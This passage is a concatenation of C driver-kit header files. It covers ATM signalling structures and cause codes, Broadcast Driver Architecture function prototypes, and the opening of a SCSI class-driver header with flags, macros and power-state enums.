#define BLLI_L2_HDLC_ABM               0x0B
#define BLLI_L2_LLC                    0x0C
#define BLLI_L2_X75                    0x0D
#define BLLI_L2_Q922                   0x0E
#define BLLI_L2_USER_SPECIFIED         0x10
#define BLLI_L2_ISO_7776               0x11

/* ATM_BLLI_IE.Layer3Protocol constants */
#define BLLI_L3_X25                    0x06
#define BLLI_L3_ISO_8208               0x07
#define BLLI_L3_X223                   0x08
#define BLLI_L3_SIO_8473               0x09
#define BLLI_L3_T70                    0x0A
#define BLLI_L3_ISO_TR9577             0x0B
#define BLLI_L3_USER_SPECIFIED         0x10

/* ATM_BLLI_IE.Layer3IPI constants */
#define BLLI_L3_IPI_SNAP               0x80
#define BLLI_L3_IPI_IP                 0xCC

typedef struct _ATM_BLLI_IE {
  ULONG Layer2Protocol;
  UCHAR Layer2Mode;
  UCHAR Layer2WindowSize;
  ULONG Layer2UserSpecifiedProtocol;
  ULONG Layer3Protocol;
  UCHAR Layer3Mode;
  UCHAR Layer3DefaultPacketSize;
  UCHAR Layer3PacketWindowSize;
  ULONG Layer3UserSpecifiedProtocol;
  ULONG Layer3IPI;
  UCHAR SnapId[5];
} ATM_BLLI_IE, *PATM_BLLI_IE;

/* ATM_BROADBAND_BEARER_CAPABILITY_IE.BearerClass constants */
#define BCOB_A                         0x00
#define BCOB_C                         0x01
#define BCOB_X                         0x02

/* ATM_BROADBAND_BEARER_CAPABILITY_IE.TrafficType constants */
#define TT_NOIND                       0x00
#define TT_CBR                         0x04
#define TT_VBR                         0x08

/* ATM_BROADBAND_BEARER_CAPABILITY_IE.TimingRequirements constants */
#define TR_NOIND                       0x00
#define TR_END_TO_END                  0x01
#define TR_NO_END_TO_END               0x02

/* ATM_BROADBAND_BEARER_CAPABILITY_IE.ClippingSusceptability constants */
#define CLIP_NOT                       0x00
#define CLIP_SUS                       0x20

/* ATM_BROADBAND_BEARER_CAPABILITY_IE.UserPlaneConnectionConfig constants */
#define UP_P2P                         0x00
#define UP_P2MP                        0x01

typedef struct _ATM_BROADBAND_BEARER_CAPABILITY_IE {
  UCHAR BearerClass;
  UCHAR TrafficType;
  UCHAR TimingRequirements;
  UCHAR ClippingSusceptability;
  UCHAR UserPlaneConnectionConfig;
} ATM_BROADBAND_BEARER_CAPABILITY_IE, *PATM_BROADBAND_BEARER_CAPABILITY_IE;

typedef struct _ATM_BROADBAND_SENDING_COMPLETE_IE {
  UCHAR SendingComplete;
} ATM_BROADBAND_SENDING_COMPLETE_IE, *PATM_BROADBAND_SENDING_COMPLETE_IE;

typedef struct _ATM_CALLING_PARTY_NUMBER_IE {
  ATM_ADDRESS Number;
  UCHAR PresentationIndication;
  UCHAR ScreeningIndicator;
} ATM_CALLING_PARTY_NUMBER_IE, *PATM_CALLING_PARTY_NUMBER_IE;

/* ATM_CAUSE_IE.Location constants */
#define ATM_CAUSE_LOC_USER                  0x00
#define ATM_CAUSE_LOC_PRIVATE_LOCAL         0x01
#define ATM_CAUSE_LOC_PUBLIC_LOCAL          0x02
#define ATM_CAUSE_LOC_TRANSIT_NETWORK       0x03
#define ATM_CAUSE_LOC_PUBLIC_REMOTE         0x04
#define ATM_CAUSE_LOC_PRIVATE_REMOTE        0x05
#define ATM_CAUSE_LOC_INTERNATIONAL_NETWORK 0x07
#define ATM_CAUSE_LOC_BEYOND_INTERWORKING   0x0A

/* ATM_CAUSE_IE.Cause constants */
#define ATM_CAUSE_UNALLOCATED_NUMBER                0x01
#define ATM_CAUSE_NO_ROUTE_TO_TRANSIT_NETWORK       0x02
#define ATM_CAUSE_NO_ROUTE_TO_DESTINATION           0x03
#define ATM_CAUSE_VPI_VCI_UNACCEPTABLE              0x0A
#define ATM_CAUSE_NORMAL_CALL_CLEARING              0x10
#define ATM_CAUSE_USER_BUSY                         0x11
#define ATM_CAUSE_NO_USER_RESPONDING                0x12
#define ATM_CAUSE_CALL_REJECTED                     0x15
#define ATM_CAUSE_NUMBER_CHANGED                    0x16
#define ATM_CAUSE_USER_REJECTS_CLIR                 0x17
#define ATM_CAUSE_DESTINATION_OUT_OF_ORDER          0x1B
#define ATM_CAUSE_INVALID_NUMBER_FORMAT             0x1C
#define ATM_CAUSE_STATUS_ENQUIRY_RESPONSE           0x1E
#define ATM_CAUSE_NORMAL_UNSPECIFIED                0x1F
#define ATM_CAUSE_VPI_VCI_UNAVAILABLE               0x23
#define ATM_CAUSE_NETWORK_OUT_OF_ORDER              0x26
#define ATM_CAUSE_TEMPORARY_FAILURE                 0x29
#define ATM_CAUSE_ACCESS_INFORMAION_DISCARDED       0x2B
#define ATM_CAUSE_NO_VPI_VCI_AVAILABLE              0x2D
#define ATM_CAUSE_RESOURCE_UNAVAILABLE              0x2F
#define ATM_CAUSE_QOS_UNAVAILABLE                   0x31
#define ATM_CAUSE_USER_CELL_RATE_UNAVAILABLE        0x33
#define ATM_CAUSE_BEARER_CAPABILITY_UNAUTHORIZED    0x39
#define ATM_CAUSE_BEARER_CAPABILITY_UNAVAILABLE     0x3A
#define ATM_CAUSE_OPTION_UNAVAILABLE                0x3F
#define ATM_CAUSE_BEARER_CAPABILITY_UNIMPLEMENTED   0x41
#define ATM_CAUSE_UNSUPPORTED_TRAFFIC_PARAMETERS    0x49
#define ATM_CAUSE_INVALID_CALL_REFERENCE            0x51
#define ATM_CAUSE_CHANNEL_NONEXISTENT               0x52
#define ATM_CAUSE_INCOMPATIBLE_DESTINATION          0x58
#define ATM_CAUSE_INVALID_ENDPOINT_REFERENCE        0x59
#define ATM_CAUSE_INVALID_TRANSIT_NETWORK_SELECTION 0x5B
#define ATM_CAUSE_TOO_MANY_PENDING_ADD_PARTY        0x5C
#define ATM_CAUSE_AAL_PARAMETERS_UNSUPPORTED        0x5D
#define ATM_CAUSE_MANDATORY_IE_MISSING              0x60
#define ATM_CAUSE_UNIMPLEMENTED_MESSAGE_TYPE        0x61
#define ATM_CAUSE_UNIMPLEMENTED_IE                  0x63
#define ATM_CAUSE_INVALID_IE_CONTENTS               0x64
#define ATM_CAUSE_INVALID_STATE_FOR_MESSAGE         0x65
#define ATM_CAUSE_RECOVERY_ON_TIMEOUT               0x66
#define ATM_CAUSE_INCORRECT_MESSAGE_LENGTH          0x68
#define ATM_CAUSE_PROTOCOL_ERROR                    0x6F

/* ATM_CAUSE_IE.Diagnostics constants */
#define ATM_CAUSE_COND_UNKNOWN            0x00
#define ATM_CAUSE_COND_PERMANENT          0x01
#define ATM_CAUSE_COND_TRANSIENT          0x02
#define ATM_CAUSE_REASON_USER             0x00
#define ATM_CAUSE_REASON_IE_MISSING       0x04
#define ATM_CAUSE_REASON_IE_INSUFFICIENT  0x08
#define ATM_CAUSE_PU_PROVIDER             0x00
#define ATM_CAUSE_PU_USER                 0x08
#define ATM_CAUSE_NA_NORMAL               0x00
#define ATM_CAUSE_NA_ABNORMAL             0x04

typedef struct _ATM_CAUSE_IE {
  UCHAR Location;
  UCHAR Cause;
  UCHAR DiagnosticsLength;
  UCHAR Diagnostics[4];
} ATM_CAUSE_IE, *PATM_CAUSE_IE;


typedef ULONG ATM_SERVICE_CATEGORY, *PATM_SERVICE_CATEGORY;

/* ATM_FLOW_PARAMETERS.ServiceCategory constants */
#define ATM_SERVICE_CATEGORY_CBR       1
#define ATM_SERVICE_CATEGORY_VBR       2
#define ATM_SERVICE_CATEGORY_UBR       4
#define ATM_SERVICE_CATEGORY_ABR       8

/* ATM_FLOW_PARAMETERS.Reserved1 constants */
#define ATM_FLOW_PARAMS_RSVD1_MPP      0x01

#ifndef SAP_FIELD_ABSENT
#define SAP_FIELD_ABSENT ((ULONG)0xfffffffe)
#endif

#ifndef SAP_FIELD_ANY
#define SAP_FIELD_ANY ((ULONG)0xffffffff)
#endif

#define SAP_FIELD_ANY_AESA_SEL ((ULONG)0xfffffffa)
#define SAP_FIELD_ANY_AESA_REST ((ULONG)0xfffffffb)

typedef struct _ATM_FLOW_PARAMETERS {
  ATM_SERVICE_CATEGORY ServiceCategory;
  ULONG AverageCellRate;
  ULONG PeakCellRate;
  ULONG MinimumCellRate;
  ULONG InitialCellRate;
  ULONG BurstLengthCells;
  ULONG MaxSduSize;
  ULONG TransientBufferExposure;
  ULONG CumulativeRMFixedRTT;
  UCHAR RateIncreaseFactor;
  UCHAR RateDecreaseFactor;
  USHORT ACRDecreaseTimeFactor;
  UCHAR MaximumCellsPerForwardRMCell;
  UCHAR MaximumForwardRMCellInterval;
  UCHAR CutoffDecreaseFactor;
  UCHAR Reserved1;
  ULONG MissingRMCellCount;
  ULONG Reserved2;
  ULONG Reserved3;
} ATM_FLOW_PARAMETERS, *PATM_FLOW_PARAMETERS;

typedef struct _ATM_VPIVCI {
  ULONG Vpi;
  ULONG Vci;
} ATM_VPIVCI, *PATM_VPIVCI;

typedef struct _ATM_MEDIA_PARAMETERS {
  ATM_VPIVCI ConnectionId;
  ATM_AAL_TYPE AALType;
  ULONG CellDelayVariationCLP0;
  ULONG CellDelayVariationCLP1;
  ULONG CellLossRatioCLP0;
  ULONG CellLossRatioCLP1;
  ULONG CellTransferDelayCLP0;
  ULONG CellTransferDelayCLP1;
  ULONG DefaultCLP;
  ATM_FLOW_PARAMETERS Transmit;
  ATM_FLOW_PARAMETERS Receive;
} ATM_MEDIA_PARAMETERS, *PATM_MEDIA_PARAMETERS;

typedef struct _ATM_PVC_SAP {
  ATM_BLLI_IE Blli;
  ATM_BHLI_IE Bhli;
} ATM_PVC_SAP, *PATM_PVC_SAP;

/* ATM_QOS_CLASS_IE constants */
#define QOS_CLASS0                     0x00
#define QOS_CLASS1                     0x01
#define QOS_CLASS2                     0x02
#define QOS_CLASS3                     0x03
#define QOS_CLASS4                     0x04

typedef struct _ATM_QOS_CLASS_IE {
  UCHAR QOSClassForward;
  UCHAR QOSClassBackward;
} ATM_QOS_CLASS_IE, *PATM_QOS_CLASS_IE;

typedef struct _ATM_RAW_IE {
  ULONG RawIELength;
  ULONG RawIEType;
  UCHAR RawIEValue[1];
} ATM_RAW_IE, *PATM_RAW_IE;

typedef struct _ATM_SAP {
  ATM_BLLI_IE Blli;
  ATM_BHLI_IE Bhli;
  ULONG NumberOfAddresses;
  UCHAR Addresses[1];
} ATM_SAP, *PATM_SAP;

typedef struct _ATM_TRAFFIC_DESCRIPTOR {
  ULONG PeakCellRateCLP0;
  ULONG PeakCellRateCLP01;
  ULONG SustainableCellRateCLP0;
  ULONG SustainableCellRateCLP01;
  ULONG MaximumBurstSizeCLP0;
  ULONG MaximumBurstSizeCLP01;
  BOOLEAN Tagging;
} ATM_TRAFFIC_DESCRIPTOR, *PATM_TRAFFIC_DESCRIPTOR;

typedef struct _ATM_TRAFFIC_DESCRIPTOR_IE {
  ATM_TRAFFIC_DESCRIPTOR ForwardTD;
  ATM_TRAFFIC_DESCRIPTOR BackwardTD;
  BOOLEAN BestEffort;
} ATM_TRAFFIC_DESCRIPTOR_IE, *PATM_TRAFFIC_DESCRIPTOR_IE;

/* ATM_TRANSIT_NETWORK_SELECTION_IE.TypeOfNetworkId constants */
#define TNS_TYPE_NATIONAL              0x40

/* ATM_TRANSIT_NETWORK_SELECTION_IE.NetworkIdPlan constants */
#define TNS_PLAN_CARRIER_ID_CODE       0x01

typedef struct _ATM_TRANSIT_NETWORK_SELECTION_IE {
  UCHAR TypeOfNetworkId;
  UCHAR NetworkIdPlan;
  UCHAR NetworkIdLength;
  UCHAR NetworkId[1];
} ATM_TRANSIT_NETWORK_SELECTION_IE, *PATM_TRANSIT_NETWORK_SELECTION_IE;

typedef struct _ATM_LIJ_CALLID_IE {
  ULONG Identifier;
} ATM_LIJ_CALLID_IE, *PATM_LIJ_CALLID_IE;

/* Q2931_ADD_PVC.Flags constants */
#define CO_FLAG_SIGNALING_VC           0x00000001
#define CO_FLAG_NO_DEST_SAP            0x00000002
#define CO_FLAG_NO_LOCAL_SAP           0x00000004

typedef struct _Q2931_ADD_PVC {
  ATM_ADDRESS CalledParty;
  ATM_ADDRESS CallingParty;
  ATM_VPIVCI ConnectionId;
  ATM_AAL_TYPE AALType;
  ATM_FLOW_PARAMETERS ForwardFP;
  ATM_FLOW_PARAMETERS BackwardFP;
  ULONG Flags;
  ATM_PVC_SAP LocalSap;
  ATM_PVC_SAP DestinationSap;
  BOOLEAN LIJIdPresent;
  ATM_LIJ_CALLID_IE LIJId;
} Q2931_ADD_PVC, *PQ2931_ADD_PVC;

typedef struct _Q2931_DELETE_PVC {
  ATM_VPIVCI ConnectionId;
} Q2931_DELETE_PVC, *PQ2931_DELETE_PVC;

typedef struct _CO_GET_CALL_INFORMATION {
  ULONG CallInfoType;
  ULONG CallInfoLength;
  PVOID CallInfoBuffer;
} CO_GET_CALL_INFORMATION, *PCO_GET_CALL_INFORMATION;

typedef ATM_ADDRESS ATM_CALLED_PARTY_NUMBER_IE;
typedef ATM_ADDRESS ATM_CALLED_PARTY_SUBADDRESS_IE;
typedef ATM_ADDRESS ATM_CALLING_PARTY_SUBADDRESS_IE;

typedef struct _Q2931_CALLMGR_PARAMETERS {
  ATM_ADDRESS CalledParty;
  ATM_ADDRESS CallingParty;
  ULONG InfoElementCount;
  UCHAR InfoElements[1];
} Q2931_CALLMGR_PARAMETERS, *PQ2931_CALLMGR_PARAMETERS;

typedef struct _ATM_VC_RATES_SUPPORTED {
  ULONG MinCellRate;
  ULONG MaxCellRate;
} ATM_VC_RATES_SUPPORTED, *PATM_VC_RATES_SUPPORTED;

typedef ULONG ATM_SERVICE_REGISTRY_TYPE;

/* ATM_SERVICE_ADDRESS_LIST.ServiceRegistryType constants */
#define ATM_SERVICE_REGISTRY_LECS      1
#define ATM_SERVICE_REGISTRY_ANS       2

typedef struct _ATM_SERVICE_ADDRESS_LIST {
  ATM_SERVICE_REGISTRY_TYPE ServiceRegistryType;
  ULONG NumberOfAddressesAvailable;
  ULONG NumberOfAddressesReturned;
  ATM_ADDRESS Address[1];
} ATM_SERVICE_ADDRESS_LIST, *PATM_SERVICE_ADDRESS_LIST;

#ifdef __cplusplus
}
#endif

```

`include/ddk/bdasup.h`:

```h
#pragma once

#if (NTDDI_VERSION >= NTDDI_WINXP)

#if defined(__cplusplus)
extern "C" {
#endif

#if defined(_ARM_)
#define STDMETHODCALLTYPE
#else
#define STDMETHODCALLTYPE __stdcall
#endif

#ifndef _WDMDDK_
typedef GUID *PGUID;
#endif

/* Types */

typedef ULONG BDA_TOPOLOGY_JOINT, *PBDA_TOPOLOGY_JOINT;

typedef struct _BDA_PIN_PAIRING {
  ULONG ulInputPin;
  ULONG ulOutputPin;
  ULONG ulcMaxInputsPerOutput;
  ULONG ulcMinInputsPerOutput;
  ULONG ulcMaxOutputsPerInput;
  ULONG ulcMinOutputsPerInput;
  ULONG ulcTopologyJoints;
  const ULONG *pTopologyJoints;
} BDA_PIN_PAIRING, *PBDA_PIN_PAIRING;

typedef struct _BDA_FILTER_TEMPLATE {
  const KSFILTER_DESCRIPTOR *pFilterDescriptor;
  ULONG ulcPinPairs;
  const BDA_PIN_PAIRING *pPinPairs;
} BDA_FILTER_TEMPLATE, *PBDA_FILTER_TEMPLATE;

typedef struct _KSM_PIN_PAIR {
  KSMETHOD Method;
  ULONG InputPinId;
  ULONG OutputPinId;
  ULONG Reserved;
} KSM_PIN_PAIR, * PKSM_PIN_PAIR;

typedef struct _KSM_PIN {
  KSMETHOD Method;
  __GNU_EXTENSION union {
    ULONG PinId;
    ULONG PinType;
  };
  ULONG Reserved;
} KSM_PIN, * PKSM_PIN;

/* Functions */

STDMETHODIMP_(NTSTATUS)
BdaCheckChanges(
  IN PIRP Irp);

STDMETHODIMP_(NTSTATUS)
BdaCommitChanges(
  IN PIRP Irp);

STDMETHODIMP_(NTSTATUS)
BdaCreateFilterFactory(
  IN PKSDEVICE pKSDevice,
  IN const KSFILTER_DESCRIPTOR *pFilterDescriptor,
  IN const BDA_FILTER_TEMPLATE *pBdaFilterTemplate);

STDMETHODIMP_(NTSTATUS)
BdaCreateFilterFactoryEx(
  IN PKSDEVICE pKSDevice,
  IN const KSFILTER_DESCRIPTOR *pFilterDescriptor,
  IN const BDA_FILTER_TEMPLATE *pBdaFilterTemplate,
  OUT PKSFILTERFACTORY  *ppKSFilterFactory);

STDMETHODIMP_(NTSTATUS)
BdaCreatePin(
  IN PKSFILTER pKSFilter,
  IN ULONG ulPinType,
  OUT ULONG *pulPinId);

STDMETHODIMP_(NTSTATUS)
BdaCreateTopology(
  IN PKSFILTER pKSFilter,
  IN ULONG InputPinId,
  IN ULONG OutputPinId);

STDMETHODIMP_(NTSTATUS)
BdaDeletePin(
  IN PKSFILTER pKSFilter,
  IN ULONG *pulPinId);

STDMETHODIMP_(NTSTATUS)
BdaFilterFactoryUpdateCacheData(
  IN PKSFILTERFACTORY pFilterFactory,
  IN const KSFILTER_DESCRIPTOR *pFilterDescriptor OPTIONAL);

STDMETHODIMP_(NTSTATUS)
BdaGetChangeState(
  IN PIRP Irp,
  OUT BDA_CHANGE_STATE *pChangeState);

STDMETHODIMP_(NTSTATUS)
BdaInitFilter(
  IN PKSFILTER pKSFilter,
  IN const BDA_FILTER_TEMPLATE *pBdaFilterTemplate);

STDMETHODIMP_(NTSTATUS)
BdaMethodCreatePin(
  IN PIRP Irp,
  IN KSMETHOD *pKSMethod,
  OUT ULONG *pulPinFactoryID);

STDMETHODIMP_(NTSTATUS)
BdaMethodCreateTopology(
  IN PIRP Irp,
  IN KSMETHOD *pKSMethod,
  OPTIONAL PVOID pvIgnored);

STDMETHODIMP_(NTSTATUS)
BdaMethodDeletePin(
  IN PIRP Irp,
  IN KSMETHOD *pKSMethod,
  OPTIONAL PVOID pvIgnored);

STDMETHODIMP_(NTSTATUS)
BdaPropertyGetControllingPinId(
  IN PIRP Irp,
  IN KSP_BDA_NODE_PIN *pProperty,
  OUT ULONG *pulControllingPinId);

STDMETHODIMP_(NTSTATUS)
BdaPropertyGetPinControl(
  IN PIRP Irp,
  IN KSPROPERTY *pKSProperty,
  OUT ULONG *pulProperty);

STDMETHODIMP_(NTSTATUS)
BdaPropertyNodeDescriptors(
  IN PIRP Irp,
  IN KSPROPERTY *pKSProperty,
  OUT BDANODE_DESCRIPTOR *pNodeDescriptorProperty);

STDMETHODIMP_(NTSTATUS)
BdaPropertyNodeEvents(
  IN PIRP Irp,
  IN KSP_NODE *pKSProperty,
  OUT GUID *pguidProperty);

STDMETHODIMP_(NTSTATUS)
BdaPropertyNodeMethods(
  IN PIRP Irp,
  IN KSP_NODE *pKSProperty,
  OUT GUID *pguidProperty);

STDMETHODIMP_(NTSTATUS)
BdaPropertyNodeProperties(
  IN PIRP Irp,
  IN KSP_NODE *pKSProperty,
  OUT GUID *pguidProperty);

STDMETHODIMP_(NTSTATUS)
BdaPropertyNodeTypes(
  IN PIRP Irp,
  IN KSPROPERTY *pKSProperty,
  OUT ULONG *pulProperty);

STDMETHODIMP_(NTSTATUS)
BdaPropertyPinTypes(
  IN PIRP Irp,
  IN KSPROPERTY *pKSProperty,
  OUT ULONG *pulProperty);

STDMETHODIMP_(NTSTATUS)
BdaPropertyTemplateConnections(
  IN PIRP Irp,
  IN KSPROPERTY *pKSProperty,
  OUT KSTOPOLOGY_CONNECTION *pConnectionProperty);

STDMETHODIMP_(NTSTATUS)
BdaStartChanges(
  IN PIRP Irp);

STDMETHODIMP_(NTSTATUS)
BdaUninitFilter(
  IN PKSFILTER pKSFilter);

STDMETHODIMP_(NTSTATUS)
BdaValidateNodeProperty(
  IN PIRP Irp,
  IN KSPROPERTY *pKSProperty);

#if defined(__cplusplus)
}
#endif

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

```

`include/ddk/classpnp.h`:

```h

#pragma once

#define _CLASS_

#include <ntdddisk.h>
#include <ntddcdrm.h>
#include <ntddtape.h>
#include <ntddscsi.h>
#include <ntddstor.h>

#include <stdio.h>

#include <scsi.h>

#define max(a,b) (((a) > (b)) ? (a) : (b))
#define min(a,b) (((a) < (b)) ? (a) : (b))

#define SRB_CLASS_FLAGS_LOW_PRIORITY      0x10000000
#define SRB_CLASS_FLAGS_PERSISTANT        0x20000000
#define SRB_CLASS_FLAGS_PAGING            0x40000000
#define SRB_CLASS_FLAGS_FREE_MDL          0x80000000

#define ASSERT_FDO(x) \
  ASSERT(((PCOMMON_DEVICE_EXTENSION) (x)->DeviceExtension)->IsFdo)

#define ASSERT_PDO(x) \
  ASSERT(!(((PCOMMON_DEVICE_EXTENSION) (x)->DeviceExtension)->IsFdo))

#define IS_CLEANUP_REQUEST(majorFunction)   \
  ((majorFunction == IRP_MJ_CLOSE) ||       \
   (majorFunction == IRP_MJ_CLEANUP) ||     \
   (majorFunction == IRP_MJ_SHUTDOWN))

#define DO_MCD(fdoExtension)                                 \
  (((fdoExtension)->MediaChangeDetectionInfo != NULL) &&     \
   ((fdoExtension)->MediaChangeDetectionInfo->MediaChangeDetectionDisableCount == 0))

#define IS_SCSIOP_READ(opCode)     \
  ((opCode == SCSIOP_READ6)   ||   \
   (opCode == SCSIOP_READ)    ||   \
   (opCode == SCSIOP_READ12)  ||   \
   (opCode == SCSIOP_READ16))

#define IS_SCSIOP_WRITE(opCode)     \
  ((opCode == SCSIOP_WRITE6)   ||   \
   (opCode == SCSIOP_WRITE)    ||   \
   (opCode == SCSIOP_WRITE12)  ||   \
   (opCode == SCSIOP_WRITE16))

#define IS_SCSIOP_READWRITE(opCode) (IS_SCSIOP_READ(opCode) || IS_SCSIOP_WRITE(opCode))

#define ADJUST_FUA_FLAG(fdoExt) {                                                       \
    if (TEST_FLAG(fdoExt->DeviceFlags, DEV_WRITE_CACHE) &&                              \
        !TEST_FLAG(fdoExt->DeviceFlags, DEV_POWER_PROTECTED) &&                         \
        !TEST_FLAG(fdoExt->ScanForSpecialFlags, CLASS_SPECIAL_FUA_NOT_SUPPORTED) ) {    \
        fdoExt->CdbForceUnitAccess = TRUE;                                              \
    } else {                                                                            \
        fdoExt->CdbForceUnitAccess = FALSE;                                             \
    }                                                                                   \
}

#define FREE_POOL(_PoolPtr)     \
    if (_PoolPtr != NULL) {     \
        ExFreePool(_PoolPtr);   \
        _PoolPtr = NULL;        \
    }

#ifdef POOL_TAGGING
#undef ExAllocatePool
#undef ExAllocatePoolWithQuota
#define ExAllocatePool(a,b) ExAllocatePoolWithTag(a,b,'nUcS')
//#define ExAllocatePool(a,b) #assert(0)
#define ExAllocatePoolWithQuota(a,b) ExAllocatePoolWithQuotaTag(a,b,'nUcS')
#endif

#define CLASS_TAG_AUTORUN_DISABLE           'ALcS'
#define CLASS_TAG_FILE_OBJECT_EXTENSION     'FLcS'
#define CLASS_TAG_MEDIA_CHANGE_DETECTION    'MLcS'
#define CLASS_TAG_MOUNT                     'mLcS'
#define CLASS_TAG_RELEASE_QUEUE             'qLcS'
#define CLASS_TAG_POWER                     'WLcS'
#define CLASS_TAG_WMI                       'wLcS'
#define CLASS_TAG_FAILURE_PREDICT           'fLcS'
#define CLASS_TAG_DEVICE_CONTROL            'OIcS'
#define CLASS_TAG_MODE_DATA                 'oLcS'
#define CLASS_TAG_MULTIPATH                 'mPcS'

#define MAXIMUM_RETRIES 4

#define CLASS_DRIVER_EXTENSION_KEY ((PVOID) ClassInitialize)

#define NO_REMOVE                         0
#define REMOVE_PENDING                    1
#define REMOVE_COMPLETE                   2

#define ClassAcquireRemoveLock(devobj, tag) \
  ClassAcquireRemoveLockEx(devobj, tag, __FILE__, __LINE__)

#ifdef TRY
#undef TRY
#endif
#ifdef LEAVE
#undef LEAVE
#endif

#ifdef FINALLY
#undef FINALLY
#endif

#define TRY
#define LEAVE             goto __tryLabel;
#define FINALLY           __tryLabel:

#if defined DebugPrint
#undef DebugPrint
#endif

#if DBG
#define DebugPrint(x) ClassDebugPrint x
#else
#define DebugPrint(x)
#endif

#define DEBUG_BUFFER_LENGTH                        256

#define START_UNIT_TIMEOUT                         (60 * 4)

#define MEDIA_CHANGE_DEFAULT_TIME                  1
#define MEDIA_CHANGE_TIMEOUT_TIME                  300

#define MAXIMUM_RETRY_FOR_SINGLE_IO_IN_100NS_UNITS 0x3b9aca00

#ifdef ALLOCATE_SRB_FROM_POOL

#define ClasspAllocateSrb(ext)                      \
  ExAllocatePoolWithTag(NonPagedPool,               \
                        sizeof(SCSI_REQUEST_BLOCK), \
                        'sBRS')

#define ClasspFreeSrb(ext, srb) ExFreePool((srb));

#else /* ALLOCATE_SRB_FROM_POOL */

#define ClasspAllocateSrb(ext)                      \
  ExAllocateFromNPagedLookasideList(                \
      &((ext)->CommonExtension.SrbLookasideList))

#define ClasspFreeSrb(ext, srb)                   \
  ExFreeToNPagedLookasideList(                    \
      &((ext)->CommonExtension.SrbLookasideList), \
      (srb))

#endif /* ALLOCATE_SRB_FROM_POOL */

#define SET_FLAG(Flags, Bit)    ((Flags) |= (Bit))
#define CLEAR_FLAG(Flags, Bit)  ((Flags) &= ~(Bit))
#define TEST_FLAG(Flags, Bit)   (((Flags) & (Bit)) != 0)

#define CLASS_WORKING_SET_MAXIMUM                         2048

#define CLASS_INTERPRET_SENSE_INFO2_MAXIMUM_HISTORY_COUNT 30000

#define CLASS_SPECIAL_DISABLE_SPIN_DOWN                 0x00000001
#define CLASS_SPECIAL_DISABLE_SPIN_UP                   0x00000002
#define CLASS_SPECIAL_NO_QUEUE_LOCK                     0x00000008
#define CLASS_SPECIAL_DISABLE_WRITE_CACHE               0x00000010
#define CLASS_SPECIAL_CAUSE_NOT_REPORTABLE_HACK         0x00000020
#if ((NTDDI_VERSION == NTDDI_WIN2KSP3) || (OSVER(NTDDI_VERSION) == NTDDI_WINXP))
#define CLASS_SPECIAL_DISABLE_WRITE_CACHE_NOT_SUPPORTED 0x00000040
#endif
#define CLASS_SPECIAL_MODIFY_CACHE_UNSUCCESSFUL         0x00000040
#define CLASS_SPECIAL_FUA_NOT_SUPPORTED                 0x00000080
#define CLASS_SPECIAL_VALID_MASK                        0x000000FB
#define CLASS_SPECIAL_RESERVED         (~CLASS_SPECIAL_VALID_MASK)

#define DEV_WRITE_CACHE                                 0x00000001
#define DEV_USE_SCSI1                                   0x00000002
#define DEV_SAFE_START_UNIT                             0x00000004
#define DEV_NO_12BYTE_CDB                               0x00000008
#define DEV_POWER_PROTECTED                             0x00000010
#define DEV_USE_16BYTE_CDB                              0x00000020

#define GUID_CLASSPNP_QUERY_REGINFOEX {0x00e34b11, 0x2444, 0x4745, {0xa5, 0x3d, 0x62, 0x01, 0x00, 0xcd, 0x82, 0xf7}}
#define GUID_CLASSPNP_SENSEINFO2      {0x509a8c5f, 0x71d7, 0x48f6, {0x82, 0x1e, 0x17, 0x3c, 0x49, 0xbf, 0x2f, 0x18}}
#define GUID_CLASSPNP_WORKING_SET     {0x105701b0, 0x9e9b, 0x47cb, {0x97, 0x80, 0x81, 0x19, 0x8a, 0xf7, 0xb5, 0x24}}

#define DEFAULT_FAILURE_PREDICTION_PERIOD 60 * 60 * 1

static inline ULONG CountOfSetBitsUChar(UCHAR _X)
{ ULONG i = 0; while (_X) { _X &= _X - 1; i++; } return i; }
static inline ULONG CountOfSetBitsULong(ULONG _X)
{ ULONG i = 0; while (_X) { _X &= _X - 1; i++; } return i; }
static inline ULONG CountOfSetBitsULong32(ULONG32 _X)
{ ULONG i = 0; while (_X) { _X &= _X - 1; i++; } return i; }
static inline ULONG CountOfSetBitsULong64(ULONG64 _X)
{ ULONG i = 0; while (_X) { _X &= _X - 1; i++; } return i; }
static inline ULONG CountOfSetBitsUlongPtr(ULONG_PTR _X)
{ ULONG i = 0; while (_X) { _X &= _X - 1; i++; } return i; }

typedef enum _MEDIA_CHANGE_DETECTION_STATE {
  MediaUnknown,
  MediaPresent,
  MediaNotPresent,
  MediaUnavailable
} MEDIA_CHANGE_DETECTION_STATE, *PMEDIA_CHANGE_DETECTION_STATE;

typedef enum _CLASS_DEBUG_LEVEL {
  ClassDebugError = 0,
  ClassDebugWarning = 1,
  ClassDebugTrace = 2,
  ClassDebugInfo = 3,
  ClassDebugMediaLocks = 8,
  ClassDebugMCN = 9,
  ClassDebugDelayedRetry = 10,
  ClassDebugSenseInfo = 11,
  ClassDebugRemoveLock = 12,
  ClassDebugExternal4 = 13,
  ClassDebugExternal3 = 14,
  ClassDebugExternal2 = 15,
  ClassDebugExternal1 = 16
} CLASS_DEBUG_LEVEL, *PCLASS_DEBUG_LEVEL;

typedef enum {
  EventGeneration,
  DataBlockCollection
} CLASSENABLEDISABLEFUNCTION;

typedef enum {
  FailurePredictionNone = 0,
  FailurePredictionIoctl,
  FailurePredictionSmart,
  FailurePredictionSense
} FAILURE_PREDICTION_METHOD, *PFAILURE_PREDICTION_METHOD;

typedef enum {
  PowerDownDeviceInitial,
  PowerDownDeviceLocked,
  PowerDownDeviceStopped,
  PowerDownDeviceOff,
  PowerDownDeviceUnlocked
} CLASS_POWER_DOWN_STATE;

typedef enum {
  PowerDownDeviceInitial2,
  PowerDownDeviceLocked2,
  PowerDownDeviceFlushed2,
  PowerDownDeviceStopped2,
  PowerDownDeviceOff2,
  PowerDownDeviceUnlocked2
} CLASS_POWER_DOWN_STATE2;

typedef enum {
  PowerUpDeviceInitial,
  PowerUpDeviceLocked,
  PowerUpDeviceOn,
  PowerUpDeviceStarted,
  PowerUpDeviceUnlocked
} CLASS_POWER_UP_STATE;

struct _CLASS_INIT_DATA;
typedef struct _CLASS_INIT_DATA CLASS_INIT_DATA, *PCLASS_INIT_DATA;

struct _CLASS_PRIVATE_FDO_DATA;
typedef struct _CLASS_PRIVATE_FDO_DATA CLASS_PRIVATE_FDO_DATA, *PCLASS_PRIVATE_FDO_DATA;

struct _CLASS_PRIVATE_PDO_DATA;
